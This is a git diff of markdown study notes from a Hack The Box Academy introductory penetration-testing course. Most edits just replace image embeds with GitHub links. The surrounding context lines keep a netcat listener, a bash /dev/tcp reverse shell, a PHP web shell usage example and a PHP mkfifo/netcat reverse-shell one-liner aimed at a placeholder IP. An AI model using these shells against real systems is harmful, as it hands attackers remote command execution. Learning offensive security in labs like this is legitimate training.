@@ -10,7 +10,7 @@ Lots of areas :
 - Incident detection and response
 Phrases that will come up often: Confidentiality, Integrity and Availability of data.
 
-![[RiskManagement.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/RiskManagement.png)
 
 Red Team : 
 - Role of the attacker.
@@ -24,11 +24,11 @@ On each pentest a new distribution must be set up. This prevents information fro
 
 ## Staying Organized : 
 
-![[Organized.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Organized.png)
 
 ## Connecting Using VPN : 
 
-![[GettingStarted.webp]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/GettingStarted.webp)
 
 To connect to the VPN :
 ```shell-session
@@ -37,8 +37,8 @@ sudo openvpn user.ovpn
 
 ## Common Terms : 
 
-![[Shell Types.png]]![[Standart Port.png]]
-![[WebVuln1.png]]![[WebVuln2.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Shell%20Types.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Standart%20Port.png)
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/tree/main/Tier%200/Fundamental/Getting%20Started/Images/WebVuln1.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/tree/main/Tier%200/Fundamental/Getting%20Started/Images/WebVuln2.png)
 ## Basic Tools : 
 ### SSH : 
 
@@ -60,7 +60,7 @@ Handle Linux terminals.
 
 ### Vim : 
 
-![[vim1.png]]![[vim2.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/vim1.png)![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/vim2.png)
 
 ## Service Scanning : 
 
@@ -169,7 +169,7 @@ SET FILEPATH /flag.txt
 
 ## Types of Shells : 
 
-![[Shell Types 1.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Shell%20Types%201.png)
 
 ### Reverse Shell : 
 
@@ -178,7 +178,7 @@ We start by starting a listener on the port of our choice:
 nc -lvnp 1234
 ```
 
-![[Netcat.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Netcat.png)
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
@@ -254,7 +254,7 @@ www-data@remotehost$ stty rows 67 columns 318
 
 Upload a shell.php in the following folders :
 
-![[WebShell.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/WebShell.png)
 
 Then after on a browser :
 http://SERVER_IP:PORT/shell.php?cmd=id
@@ -357,7 +357,7 @@ user@remotehost$ md5sum shell
 
 ## Nibbles - Enumeration : 
 
-![[Boxes.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Boxes.png)
 
 ## Nibbles - Web Footprinting : 
 
@@ -366,7 +366,7 @@ Whatweb is a script allowing you to know which version works on which site.
 ## Nibbles - Initial Foothold : 
 
 Once connected, there are several attack vectors:
-![[Other attacks.png]]
+![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Fundamental/Getting%20Started/Images/Other%20attacks.png)
 
 ```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Votre_ip Port >/tmp/f"); ?>
